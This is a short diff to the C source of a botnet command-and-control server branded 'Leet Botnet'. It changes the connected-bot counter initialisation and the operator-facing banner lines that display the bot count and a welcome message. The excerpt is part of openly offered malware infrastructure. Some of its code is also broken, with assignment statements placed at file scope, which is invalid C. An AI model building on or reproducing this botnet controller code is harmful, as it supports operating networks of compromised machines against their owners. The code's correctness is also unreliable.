@@ -25,7 +25,7 @@ unsigned int BotsConnected() {
 	}
 	return total;
 }
-int i;
+int i =0;
 clients[i].connected = 1;
 clients[i].ip = "1.1.1.1";
 void *TitleWriter(void *sock) {
@@ -124,8 +124,8 @@ int main(int argc, char **argv) {
 		
 		sprintf(ascii_banner_line1, "\x1b[36m Leet Botnet \r\n");
 		sprintf(ascii_banner_line2, "\r\n");	
-		sprintf(welcome_line,       "\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected(), OperatorsConnected); 
-		sprintf(banner_bot_count, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, %s\x1b[36m --------\x1b[37m#\r\n", accounts[find_line].username);
+		sprintf(welcome_line,       "\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected()); 
+		sprintf(banner_bot_count, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome Leet\x1b[36m --------\x1b[37m#\r\n");
 
 	}
 	for(x=0; x != THREADS; x++) {
